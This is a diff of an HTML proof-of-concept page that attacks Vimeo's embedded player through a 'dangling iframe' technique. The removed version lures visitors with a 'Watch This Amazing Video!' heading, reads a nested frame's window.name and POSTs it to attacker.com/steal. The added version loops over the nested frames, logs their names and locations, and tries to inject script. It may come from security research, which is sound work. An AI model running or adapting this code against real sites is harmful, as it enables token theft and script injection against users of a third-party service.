@@ -1,80 +1,56 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Vimeo Token Theft via Dangling iframe</title>
-</head>
+<head><title>Dangling iframe Test</title></head>
 <body>
-    <h1>🎬 Watch This Amazing Video!</h1>
+    <h1>Testing Dangling iframe on Vimeo</h1>
+    <div id="log"></div>
     
-    <!-- Step 1: Embed Vimeo player with controlled name parameter -->
-    <iframe 
-        id="vimeo"
-        src="https://player.vimeo.com/video/935884964"
-        name="vimeoPlayer"
-        width="640" 
-        height="360">
-    </iframe>
-
-    <div id="results"></div>
-
+    <iframe id="vimeo" src="https://player.vimeo.com/video/935884964"></iframe>
+    
     <script>
+        const log = document.getElementById('log');
         const vimeoFrame = document.getElementById('vimeo');
         
-        // Wait for iframe to load
+        function addLog(msg) {
+            log.innerHTML += `<p>${msg}</p>`;
+            console.log(msg);
+        }
+        
         setTimeout(() => {
-            console.log('Step 1: Vimeo iframe loaded');
+            const win = vimeoFrame.contentWindow;
             
-            // Step 2: Try to access nested iframes within Vimeo player
-            // Vimeo player might have nested iframes for ads, analytics, etc.
-            tryDanglingAttack();
-        }, 3000);
-
-        function tryDanglingAttack() {
-            try {
-                const vimeoWindow = vimeoFrame.contentWindow;
-                
-                // Check if there are nested iframes
-                console.log('Checking for nested iframes...');
-                
-                // Try to access nested iframe (if exists)
-                if (vimeoWindow[0]) {
-                    console.log('Found nested iframe!');
+            addLog(`Nested frames count: ${win.length}`);
+            
+            // Try each nested frame
+            for(let i = 0; i < win.length; i++) {
+                try {
+                    addLog(`Attempting frame ${i}...`);
                     
-                    // Change nested iframe to about:blank
-                    // This changes ownership to OUR origin
-                    vimeoWindow[0].location = 'about:blank';
+                    // Set to about:blank
+                    win[i].location = 'about:blank';
                     
-                    // Wait a moment for the change
                     setTimeout(() => {
                         try {
-                            // Now we can read window.name!
-                            const leakedData = vimeoWindow[0].name;
-                            console.log('🚨 LEAKED DATA:', leakedData);
+                            const name = win[i].name;
+                            addLog(`✅ Frame ${i} name: ${name}`);
                             
-                            document.getElementById('results').innerHTML = 
-                                '<h2>🚨 Data Leaked!</h2><pre>' + 
-                                leakedData + 
-                                '</pre>';
+                            // Try to read more
+                            addLog(`Frame ${i} location: ${win[i].location.href}`);
                             
-                            // Exfiltrate
-                            fetch('https://attacker.com/steal', {
-                                method: 'POST',
-                                body: leakedData
-                            });
+                            // Try to inject script
+                            const doc = win[i].document;
+                            doc.write('<script>alert("Owned frame ' + i + '!")</scr' + 'ipt>');
                             
                         } catch(e) {
-                            console.log('Cannot read window.name:', e.message);
+                            addLog(`❌ Cannot read frame ${i}: ${e.message}`);
                         }
-                    }, 500);
+                    }, 1000);
                     
-                } else {
-                    console.log('No nested iframes found');
+                } catch(e) {
+                    addLog(`❌ Frame ${i} error: ${e.message}`);
                 }
-                
-            } catch(e) {
-                console.log('Error:', e.message);
             }
-        }
+        }, 3000);
     </script>
 </body>
 </html>
